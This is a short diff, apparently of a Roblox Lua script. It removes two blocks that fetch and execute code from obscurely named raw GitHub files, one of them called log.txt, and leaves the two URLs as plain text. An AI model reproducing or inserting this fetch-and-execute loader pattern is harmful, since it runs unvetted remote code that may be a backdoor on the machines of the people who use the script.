@@ -1,7 +1,2 @@
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/q6292/x0q1/refs/heads/main/x1q"))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/q6292/x0q1/refs/heads/main/log.txt"))()
-end)
+https://raw.githubusercontent.com/q6292/x0q1/refs/heads/main/x1q
+https://raw.githubusercontent.com/q6292/x0q1/refs/heads/main/log.txt
